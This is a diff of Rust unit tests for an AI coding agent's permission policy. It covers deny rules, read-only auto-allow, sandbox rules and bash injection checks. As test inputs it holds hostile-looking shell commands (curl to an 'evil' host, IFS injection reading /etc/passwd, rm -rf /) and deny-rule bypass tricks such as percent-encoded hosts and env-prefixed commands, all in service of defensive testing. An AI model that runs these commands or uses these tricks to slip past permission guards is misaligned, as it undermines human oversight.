+        assert_eq!(url_hostname("http://EXAMPLE.com/Path").as_deref(), Some("example.com"));
+        // A single-label host is valid and preserved (locks the `https://x` test).
+        assert_eq!(url_hostname("https://x").as_deref(), Some("x"));
+    }
+
+    #[test]
+    fn url_hostname_idn_is_punycoded() {
+        // claude-code keys `domain:${new URL(n).hostname}`, which IDNA/Punycode-
+        // encodes the host. The old splitter left the raw unicode, mis-keying the
+        // rule. `münchen.de` → `xn--mnchen-3ya.de`.
+        assert_eq!(
+            url_hostname("https://münchen.de/page").as_deref(),
+            Some("xn--mnchen-3ya.de")
+        );
+    }
+
+    #[test]
+    fn url_hostname_percent_encoded_is_decoded() {
+        // `new URL().hostname` percent-decodes the host: `foo%2Ebar.com` →
+        // `foo.bar.com` (`%2E` is `.`). The old splitter kept the literal `%2E`,
+        // letting a `WebFetch(domain:foo.bar.com)` deny rule be bypassed.
+        assert_eq!(
+            url_hostname("https://foo%2Ebar.com/x").as_deref(),
+            Some("foo.bar.com")
+        );
+    }
+
+    #[test]
+    fn webfetch_percent_encoded_host_no_longer_bypasses_deny() {
+        // END-TO-END deny-bypass regression: a `WebFetch(domain:foo.bar.com)` deny
+        // rule must now match a request to the percent-encoded `foo%2Ebar.com`,
+        // because the host extractor decodes it to `foo.bar.com` (was a bypass).
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["WebFetch(domain:foo.bar.com)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("WebFetch", &webfetch("https://foo%2Ebar.com/secrets")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn webfetch_idn_host_matches_punycode_deny_rule() {
+        // A deny rule keyed by the Punycode host matches an IDN request URL.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["WebFetch(domain:xn--mnchen-3ya.de)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("WebFetch", &webfetch("https://münchen.de/page")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn agent_type_deny_only_matches_that_type() {
+        // `Agent(Explore)` denies only the Explore subagent type, not all Agents.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Agent(Explore)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Agent", &serde_json::json!({ "subagent_type": "Explore" })),
+            PermissionResult::Deny { .. }
+        ));
+        // A different agent type is NOT denied (Agent is AllowByDefault → the
+        // gate would auto-allow; the parity point here is that it is NOT a deny).
+        assert!(matches!(
+            p.authorize(
+                "Agent",
+                &serde_json::json!({ "subagent_type": "general-purpose" })
+            ),
+            PermissionResult::Ask { .. }
+        ));
+        // The legacy alias `Task` resolves to `Agent` content matching as well.
+        let p2 = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Task(Explore)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p2.authorize("Agent", &serde_json::json!({ "subagent_type": "Explore" })),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn agent_type_deny_source_and_content_set() {
+        use crate::rule::PermissionRuleSource;
+        // `Agent(Explore)` in project-local settings → deny source is the matched
+        // type, surfaced as the raw `SettingSource` identifier, and the content
+        // set contains exactly that type.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Agent(Explore)", "Agent(Plan)"] } }"#,
+            PermissionMode::Default,
+        );
+        // `policy_with_roots` loads from the PROJECT settings bucket.
+        assert_eq!(
+            p.agent_type_deny_source("Explore"),
+            Some(PermissionRuleSource::ProjectSettings)
+        );
+        assert_eq!(
+            p.agent_type_deny_source("general-purpose"),
+            None,
+            "an unrelated type is not denied"
+        );
+        // Raw SettingSource identifier is byte-locked to claude-code.
+        assert_eq!(
+            PermissionRuleSource::ProjectSettings.lingxi_settings_source(),
+            "projectSettings"
+        );
+        assert_eq!(
+            PermissionRuleSource::LocalSettings.lingxi_settings_source(),
+            "localSettings"
+        );
+        let mut set = p.agent_deny_content_types();
+        set.sort();
+        assert_eq!(set, vec!["Explore".to_string(), "Plan".to_string()]);
+        // The `Task` alias is matched too (LingXi stores the alias verbatim).
+        let p2 = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Task(Explore)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert_eq!(
+            p2.agent_type_deny_source("Explore"),
+            Some(PermissionRuleSource::ProjectSettings)
+        );
+        assert_eq!(p2.agent_deny_content_types(), vec!["Explore".to_string()]);
+    }
+
+    // ── PERM.4: Plan mode + isBypassPermissionsModeAvailable bypasses ──────
+
+    #[test]
+    fn plan_with_bypass_available_allows_mutating_tool() {
+        // Plan + bypass-available → a mutating tool is ALLOWED (tagged Plan),
+        // instead of the plan-mutation backstop ask.
+        let p = PermissionPolicy::new(PermissionMode::Plan).with_bypass_available(true);
+        match p.authorize("Edit", &edit("/proj/src/x.rs")) {
+            PermissionResult::Allow { reason, .. } => assert!(
+                matches!(
+                    reason,
+                    PermissionDecisionReason::PermissionMode {
+                        mode: PermissionMode::Plan
+                    }
+                ),
+                "plan bypass must tag the Allow with Plan mode, got {reason:?}"
+            ),
+            other => panic!("expected Allow(Plan), got {other:?}"),
+        }
+        // Bash (also non-plan-safe) is likewise allowed.
+        assert!(matches!(
+            p.authorize("Bash", &serde_json::json!({ "command": "rm -rf /tmp/x" })),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    #[test]
+    fn plan_without_bypass_available_still_asks() {
+        // No bypass-available → the plan-mutation backstop still fires.
+        let p = PermissionPolicy::new(PermissionMode::Plan);
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/src/x.rs")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn plan_bypass_respects_deny_rule_and_killswitch() {
+        // A deny rule still wins (bypass-immune — it runs before the bypass check).
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Edit(src/**)"] } }"#,
+            PermissionMode::Plan,
+        )
+        .with_bypass_available(true);
+        assert!(matches!(
+            p.authorize("Edit", &edit("/proj/src/secret.rs")),
+            PermissionResult::Deny { .. }
+        ));
+        // The killswitch overrides the plan bypass → back to the plan-mutation ask.
+        let mut p2 = PermissionPolicy::new(PermissionMode::Plan).with_bypass_available(true);
+        p2.bypass_killswitch_active = true;
+        assert!(matches!(
+            p2.authorize("Edit", &edit("/proj/src/x.rs")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    // ── PERM (bash extras): read-only allow (TS step 7) ────────────────────
+
+    fn matched_other(reason: &PermissionDecisionReason, needle: &str) -> bool {
+        matches!(reason, PermissionDecisionReason::Other { reason } if reason.contains(needle))
+    }
+
+    #[test]
+    fn read_only_command_auto_allows_with_other_reason() {
+        // (c) A read-only command with NO rules → Allow tagged Other("Read-only").
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        for cmd in ["cat foo.txt", "ls -la", "grep pat file", "pwd", "head -n3 a"] {
+            match p.authorize("Bash", &bash(cmd)) {
+                PermissionResult::Allow { reason, .. } => assert!(
+                    matched_other(&reason, "Read-only command is allowed"),
+                    "{cmd}: read-only allow must carry the byte-faithful reason, got {reason:?}"
+                ),
+                other => panic!("{cmd}: expected read-only Allow, got {other:?}"),
+            }
+        }
+    }
+
+    #[test]
+    fn read_only_compound_all_read_only_allows() {
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        assert!(matches!(
+            p.authorize("Bash", &bash("cat a | grep b")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    #[test]
+    fn read_only_does_not_allow_writing_command() {
+        // A writer (not read-only) still asks (no rule, Default mode).
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        assert!(matches!(
+            p.authorize("Bash", &bash("rm -rf /tmp/x")),
+            PermissionResult::Ask { .. }
+        ));
+        // A read command compounded with a writer is NOT auto-allowed.
+        assert!(matches!(
+            p.authorize("Bash", &bash("cat a && rm b")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn read_only_does_not_allow_redirect_escape() {
+        // A read command WITH a redirect is not read-only — and a redirect
+        // outside cwd asks via the path-constraint guard (runs first). The
+        // read-only layer must never auto-allow an escape.
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        assert!(matches!(
+            p.authorize("Bash", &bash("cat a > /etc/x")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::Other { .. },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn read_only_deny_rule_still_wins() {
+        // (a) An explicit deny on a read-only command still denies (deny walk runs
+        // before the read-only layer).
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Bash(cat:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("cat secret")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn read_only_ask_rule_still_asks() {
+        // An explicit ask on a read-only command still asks (ask walk precedes
+        // the read-only allow).
+        let p = policy_with_roots(
+            r#"{ "permissions": { "ask": ["Bash(grep:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("grep pat file")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn read_only_works_without_roots() {
+        // The read-only inference is roots-independent — a read-only command is
+        // allowed even when no roots are configured.
+        let rules = crate::loader::permission_rules_from_settings_json(
+            r#"{ "permissions": {} }"#,
+            PermissionRuleSource::ProjectSettings,
+        )
+        .unwrap();
+        let p = PermissionPolicy::from_rules(PermissionMode::Default, rules);
+        assert!(matches!(
+            p.authorize("Bash", &bash("ls")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    // ── PERM (bash extras): general sed constraints (TS step 5b, all modes) ─
+
+    #[test]
+    fn default_mode_in_place_sed_asks() {
+        // (d, ask) In Default mode `allowFileWrites=false`, so an in-place sed is
+        // NOT on the read-only allowlist → ask with the byte-locked sed message.
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        match p.authorize("Bash", &bash("sed -i 's/a/b/' ./local.txt")) {
+            PermissionResult::Ask { reason, prompt, .. } => {
+                assert!(
+                    matches!(reason, PermissionDecisionReason::Other { .. }),
+                    "sed ask must use Other, got {reason:?}"
+                );
+                assert_eq!(prompt.message, crate::sed_validation::SED_ASK_MESSAGE);
+            }
+            other => panic!("expected Ask(Other), got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn default_mode_read_only_sed_does_not_ask_from_sed_layer() {
+        // (d, safe) A read-only `sed -n p file` is Safe in every mode, so the sed
+        // layer does NOT ask. `sed` is NOT on the read-only base allowlist (1:1
+        // with TS `READONLY_COMMANDS`, which omits `sed`), so in Default mode it
+        // is neither sed-asked nor read-only-allowed → it falls through to the
+        // generic Default-mode ask (a PermissionMode reason, NOT the sed Other).
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        match p.authorize("Bash", &bash("sed -n p file.txt")) {
+            PermissionResult::Ask { reason, .. } => assert!(
+                matches!(
+                    reason,
+                    PermissionDecisionReason::PermissionMode {
+                        mode: PermissionMode::Default
+                    }
+                ),
+                "a Safe sed must fall through to the mode ask, not the sed ask: {reason:?}"
+            ),
+            other => panic!("expected Default-mode Ask, got {other:?}"),
+        }
+        // In AcceptEdits mode the SAME safe sed IS auto-allowed (the AcceptEdits
+        // bash auto-allow arm covers `sed` when its verdict is Safe).
+        let pa = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::AcceptEdits);
+        assert!(matches!(
+            pa.authorize("Bash", &bash("sed -n p file.txt")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    #[test]
+    fn default_mode_dangerous_sed_asks() {
+        // (d, deny→ask) A sed with a dangerous write command asks in Default mode.
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        assert!(matches!(
+            p.authorize("Bash", &bash("sed -n 'w /tmp/out' file")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::Other { .. },
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn sed_deny_rule_beats_sed_constraint_ask() {
+        // An explicit deny on the sed command wins over the sed-constraint ask.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Bash(sed:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash("sed -i 's/a/b/' /etc/passwd")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    // ── PERM (bash extras): sandbox auto-allow ─────────────────────────────
+
+    fn sandbox_cfg(excluded: &[&str]) -> crate::sandbox_auto_allow::SandboxAutoAllowConfig {
+        crate::sandbox_auto_allow::SandboxAutoAllowConfig::new(
+            true,
+            true,
+            excluded.iter().map(|s| (*s).to_string()).collect(),
+        )
+    }
+
+    #[test]
+    fn sandbox_auto_allow_allows_sandboxable_command() {
+        // (e) sandbox config present + a sandboxable command + no deny/ask rule →
+        // Allow tagged Other("Auto-allowed with sandbox").
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default)
+            .with_sandbox_runtime(sandbox_cfg(&[]));
+        // `npm install` is NOT read-only and matches no rule — without sandbox it
+        // would ask; WITH sandbox auto-allow it is allowed.
+        match p.authorize("Bash", &bash("npm install")) {
+            PermissionResult::Allow { reason, .. } => assert!(
+                matched_other(&reason, "Auto-allowed with sandbox"),
+                "sandbox auto-allow must carry the byte-faithful reason, got {reason:?}"
+            ),
+            other => panic!("expected sandbox Allow, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn sandbox_auto_allow_explicit_deny_still_wins() {
+        // (e) An explicit deny still wins over sandbox-auto-allow (deny walk runs
+        // before the sandbox layer).
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Bash(curl:*)"] } }"#,
+            PermissionMode::Default,
+        )
+        .with_sandbox_runtime(sandbox_cfg(&[]));
+        assert!(matches!(
+            p.authorize("Bash", &bash("curl https://evil")),
+            PermissionResult::Deny { .. }
+        ));
+        // …even hidden in a compound command.
+        assert!(matches!(
+            p.authorize("Bash", &bash("echo ok && curl https://evil")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn sandbox_auto_allow_ask_rule_still_asks() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "ask": ["Bash(npm publish:*)"] } }"#,
+            PermissionMode::Default,
+        )
+        .with_sandbox_runtime(sandbox_cfg(&[]));
+        assert!(matches!(
+            p.authorize("Bash", &bash("npm publish --tag beta")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn sandbox_excluded_command_not_auto_allowed() {
+        // An excluded command is NOT sandboxed → NOT auto-allowed → falls through
+        // to the Default-mode ask (no rule, not read-only).
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default)
+            .with_sandbox_runtime(sandbox_cfg(&["bazel:*"]));
+        assert!(matches!(
+            p.authorize("Bash", &bash("bazel build //...")),
+            PermissionResult::Ask { .. }
+        ));
+        // A non-excluded command IS auto-allowed.
+        assert!(matches!(
+            p.authorize("Bash", &bash("npm install")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    #[test]
+    fn no_sandbox_config_is_no_op() {
+        // Without a sandbox config the layer is a no-op: a non-read-only, no-rule
+        // command asks (unchanged behavior).
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        assert!(matches!(
+            p.authorize("Bash", &bash("npm install")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    #[test]
+    fn disabled_sandbox_config_is_no_op() {
+        // An explicitly-disabled sandbox config never auto-allows.
+        let cfg = crate::sandbox_auto_allow::SandboxAutoAllowConfig::new(false, true, vec![]);
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default)
+            .with_sandbox_runtime(cfg);
+        assert!(matches!(
+            p.authorize("Bash", &bash("npm install")),
+            PermissionResult::Ask { .. }
+        ));
+    }
+
+    // ── SAFETY INVARIANT: non-shell tools are unaffected by the extras ─────
+
+    #[test]
+    fn non_shell_tool_decision_unchanged_by_extras() {
+        // (f) The sandbox / sed / read-only layers are shell-only. A non-shell
+        // tool's decision is identical with or without a sandbox config.
+        let base = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        let with_sb = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default)
+            .with_sandbox_runtime(sandbox_cfg(&[]));
+        // Edit (mutating, no rule) → ask in both.
+        assert!(matches!(
+            base.authorize("Edit", &edit("/proj/src/x.rs")),
+            PermissionResult::Ask { .. }
+        ));
+        assert!(matches!(
+            with_sb.authorize("Edit", &edit("/proj/src/x.rs")),
+            PermissionResult::Ask { .. }
+        ));
+        // WebFetch is not a shell tool — a sandbox config must not auto-allow it.
+        assert!(matches!(
+            with_sb.authorize("WebFetch", &serde_json::json!({ "url": "https://x" })),
+            PermissionResult::Ask { .. }
+        ));
+        // A deny rule on a non-shell tool is unaffected.
+        let deny = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Read(./secrets/**)"] } }"#,
+            PermissionMode::Default,
+        )
+        .with_sandbox_runtime(sandbox_cfg(&[]));
+        assert!(matches!(
+            deny.authorize("Read", &edit("/proj/secrets/key.pem")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn env_prefix_and_compound_still_hit_deny_with_all_extras() {
+        // (g) With the sandbox config + read-only layer live, a denied command
+        // hidden behind an env prefix or a benign compound STILL denies.
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Bash(secret-tool:*)"] } }"#,
+            PermissionMode::Default,
+        )
+        .with_sandbox_runtime(sandbox_cfg(&[]));
+        assert!(matches!(
+            p.authorize("Bash", &bash("FOO=bar secret-tool dump")),
+            PermissionResult::Deny { .. }
+        ));
+        assert!(matches!(
+            p.authorize("Bash", &bash("cat ok && secret-tool dump")),
+            PermissionResult::Deny { .. }
+        ));
+        assert!(matches!(
+            p.authorize("Bash", &bash("HTTPS_PROXY=x secret-tool dump")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    // ── 2c: bash command-injection safety chain wiring ──────────────────
+
+    /// A dangerous shell command (backtick substitution) with no matching rule
+    /// ASKS via the safety chain, tagged `SafetyCheck`.
+    #[test]
+    fn bash_safety_dangerous_command_asks_via_safety_check() {
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        let r = p.authorize("Bash", &bash("echo `whoami`"));
+        match r {
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::SafetyCheck { reason, .. },
+                ..
+            } => {
+                // With bash-ast wired, the AST verdict is authoritative: a backtick
+                // command substitution is a DANGEROUS_TYPES node → TooComplex
+                // "Contains command_substitution" (byte-faithful to the 2.1.195
+                // binary's `Yg`). Without bash-ast, the legacy battery's "backticks".
+                #[cfg(feature = "bash-ast")]
+                assert!(reason.contains("command_substitution"), "reason was: {reason}");
+                #[cfg(not(feature = "bash-ast"))]
+                assert!(reason.contains("backticks"), "reason was: {reason}");
+            }
+            other => panic!("expected SafetyCheck ask, got {other:?}"),
+        }
+    }
+
+    /// AST-authoritative gate (bash-ast): every dangerous command must surface a
+    /// `SafetyCheck` ask — never silently Allow. Exercises the wired
+    /// parse_for_security → check_semantics path end-to-end.
+    #[cfg(feature = "bash-ast")]
+    #[test]
+    fn bash_ast_gate_flags_dangerous_commands() {
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        for cmd in [
+            "find . -exec rm {} ;",        // Simple + check_semantics Deny (find)
+            "watch rm -rf /",              // Simple + Deny (runs-its-argument)
+            "jobs -x rm",                  // Simple + Deny (jobs -x)
+            "setopt extendedglob",         // Simple + Deny (zsh builtin)
+            "declare -n ref=x",            // Simple + Deny (declare -n)
+            "set -o extendedglob",         // Simple + Deny (set -o)
+            "echo $(whoami)",              // TooComplex (command_substitution)
+            "eval id",                     // Simple + Deny (eval-like)
+        ] {
+            match p.authorize("Bash", &bash(cmd)) {
+                PermissionResult::Ask {
+                    reason: PermissionDecisionReason::SafetyCheck { .. },
+                    ..
+                } => {}
+                other => panic!("expected SafetyCheck ask for {cmd:?}, got {other:?}"),
+            }
+        }
+    }
+
+    /// The AST safety gate overrides a permissive prefix rule: even with
+    /// `Bash(find:*)` allowed, `find … -exec …` still asks (the reason string is
+    /// literally "cannot be auto-allowed by a Bash(find:*) prefix rule").
+    #[cfg(feature = "bash-ast")]
+    #[test]
+    fn bash_ast_gate_overrides_prefix_allow() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash(find:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        match p.authorize("Bash", &bash("find . -exec rm {} ;")) {
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::SafetyCheck { reason, .. },
+                ..
+            } => assert!(reason.contains("find with '-exec'"), "reason was: {reason}"),
+            other => panic!("expected SafetyCheck ask despite Bash(find:*), got {other:?}"),
+        }
+        // A benign find under the same rule is allowed (no safety ask).
+        assert!(matches!(
+            p.authorize("Bash", &bash("find . -name x -type f")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    /// IFS injection (a different validator) also asks via the safety chain.
+    #[test]
+    fn bash_safety_ifs_injection_asks() {
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        assert!(matches!(
+            p.authorize("Bash", &bash("cat${IFS}/etc/passwd")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::SafetyCheck { .. },
+                ..
+            }
+        ));
+    }
+
+    /// An explicit DENY rule still wins over the safety chain (deny walk runs
+    /// first) — the safety check must NOT downgrade a deny.
+    #[test]
+    fn bash_safety_explicit_deny_still_denies_dangerous_command() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Bash(curl:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        // `curl \`whoami\`` trips the backtick validator AND the deny rule; deny wins.
+        assert!(matches!(
+            p.authorize("Bash", &bash("curl `whoami`")),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    /// A PREFIX allow rule does NOT override the safety-ask (TS runs
+    /// `bashCommandIsSafe` at step 3 of `checkCommandAndSuggestRules`, BEFORE the
+    /// prefix-allow grant at step 4). Only an EXACT allow rule bypasses safety
+    /// (TS step 1, `bashToolCheckExactMatchPermission`) — see
+    /// `bash_safety_exact_allow_rule_bypasses_safety_ask` for that case.
+    #[test]
+    fn bash_safety_prefix_allow_rule_does_not_override_safety_ask() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash(echo:*)"] } }"#,
+            PermissionMode::Default,
+        );
+        // `echo \`whoami\`` is covered by the PREFIX rule Bash(echo:*), but the
+        // command does NOT exactly equal the bare prefix `echo`, so the exact-allow
+        // short-circuit does not fire and the backtick subst asks via safety.
+        match p.authorize("Bash", &bash("echo `whoami`")) {
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::SafetyCheck { .. },
+                ..
+            } => {}
+            other => panic!("expected SafetyCheck ask despite prefix allow rule, got {other:?}"),
+        }
+    }
+
+    /// An EXACT allow rule (the full command == the rule content) BYPASSES the
+    /// safety-ask: a command the user explicitly allowed 1:1 is allowed without a
+    /// safety re-ask (TS `bashToolCheckExactMatchPermission` short-circuits at the
+    /// very top of `checkCommandAndSuggestRules`, BEFORE the step-3 safety check).
+    #[test]
+    fn bash_safety_exact_allow_rule_bypasses_safety_ask() {
+        // The dangerous command trips the `$()` substitution validator, yet an
+        // EXACT allow rule for that exact command must allow it (not SafetyCheck).
+        let p = policy_with_roots(
+            r#"{ "permissions": { "allow": ["Bash(eval \"echo $(whoami)\")"] } }"#,
+            PermissionMode::Default,
+        );
+        // Sanity: with NO rule the same command asks via the safety chain.
+        assert!(matches!(
+            policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default)
+                .authorize("Bash", &bash(r#"eval "echo $(whoami)""#)),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::SafetyCheck { .. },
+                ..
+            }
+        ));
+        // With the exact allow rule it is ALLOWED via the matched rule, bypassing
+        // the safety check.
+        match p.authorize("Bash", &bash(r#"eval "echo $(whoami)""#)) {
+            PermissionResult::Allow {
+                reason: PermissionDecisionReason::MatchedRule { .. },
+                ..
+            } => {}
+            other => panic!("expected exact-allow to bypass safety, got {other:?}"),
+        }
+    }
+
+    /// An EXACT DENY rule still wins over an exact-allow command shape: the exact
+    /// short-circuit is ALLOW-only and runs AFTER the deny walk, so an explicit
+    /// deny of a dangerous command is unaffected by the new bypass.
+    #[test]
+    fn bash_safety_exact_allow_short_circuit_does_not_override_deny() {
+        let p = policy_with_roots(
+            r#"{ "permissions": { "deny": ["Bash(eval \"echo $(whoami)\")"] } }"#,
+            PermissionMode::Default,
+        );
+        assert!(matches!(
+            p.authorize("Bash", &bash(r#"eval "echo $(whoami)""#)),
+            PermissionResult::Deny { .. }
+        ));
+    }
+
+    /// A benign read-only command is unaffected by the safety chain (it passes
+    /// every validator and is auto-allowed by the read-only layer below).
+    #[test]
+    fn bash_safety_benign_command_unaffected() {
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        // `pwd` passes every safety validator and is read-only → auto-allowed by
+        // the 3c read-only layer (the safety chain must NOT have intercepted it).
+        assert!(matches!(
+            p.authorize("Bash", &bash("pwd")),
+            PermissionResult::Allow { .. }
+        ));
+        // A benign command with NO matching rule that is read-only also allows.
+        assert!(matches!(
+            p.authorize("Bash", &bash("ls")),
+            PermissionResult::Allow { .. }
+        ));
+    }
+
+    /// The safety chain is shell-tool only: a non-shell tool whose input happens
+    /// to contain backtick-like text is NOT affected.
+    #[test]
+    fn bash_safety_does_not_affect_non_shell_tools() {
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        // Edit with a backtick in the path still falls through to the normal
+        // editor flow (Default mode → ask, NOT a SafetyCheck ask). Allow/Deny
+        // are also fine — the point is it must not be a SafetyCheck ask.
+        if let PermissionResult::Ask { reason, .. } =
+            p.authorize("Edit", &edit("/proj/`whoami`.rs"))
+        {
+            assert!(
+                !matches!(reason, PermissionDecisionReason::SafetyCheck { .. }),
+                "non-shell tool must not get a SafetyCheck ask"
+            );
+        }
+    }
+
+    /// A zsh dangerous command (`zmodload`) asks even when wrapped in env/prefix.
+    #[test]
+    fn bash_safety_zsh_zmodload_asks() {
+        let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
+        assert!(matches!(
+            p.authorize("Bash", &bash("zmodload zsh/system")),
+            PermissionResult::Ask {
+                reason: PermissionDecisionReason::SafetyCheck { .. },
+                ..
+            }
+        ));
+    }
+}
